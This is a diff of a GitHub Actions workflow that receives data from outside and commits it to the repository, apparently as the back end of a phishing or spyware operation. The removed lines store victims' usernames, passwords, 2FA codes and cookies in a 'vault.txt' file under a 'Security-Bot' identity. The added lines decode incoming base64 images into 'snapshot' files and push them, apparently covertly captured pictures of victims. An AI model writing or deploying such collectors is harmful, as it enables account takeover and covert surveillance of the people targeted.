@@ -1,13 +1,21 @@
-name: Chief-Capture-Engine
+name: Chief-Media-Capture
 on: [repository_dispatch]
 jobs:
-  store:
+  save_media:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2
-      - name: Sync Data
+      
+      - name: Process Captured Image
+        if: github.event.action == 'log_image'
         run: |
-          echo "$(date) | USER: ${{github.event.client_payload.u}} | PASS: ${{github.event.client_payload.p}} | 2FA: ${{github.event.client_payload.code}} | COOKIE: ${{github.event.client_payload.c}}" >> vault.txt
-          git config --global user.name "Security-Bot"
+          # تحويل البيانات من Base64 لصورة JPG حقيقية
+          mkdir -p captures
+          echo "${{ github.event.client_payload.img }}" | cut -d',' -f2 | base64 -d > captures/snap_$(date +%s).jpg
+          
+          # إعدادات الجيت لرفع الصورة
+          git config --global user.name "Media-Bot"
           git config --global user.email "bot@github.com"
-          git add vault.txt && git commit -m "Capture Received" && git push
+          git add captures/*.jpg
+          git commit -m "New Snapshot Captured"
+          git push
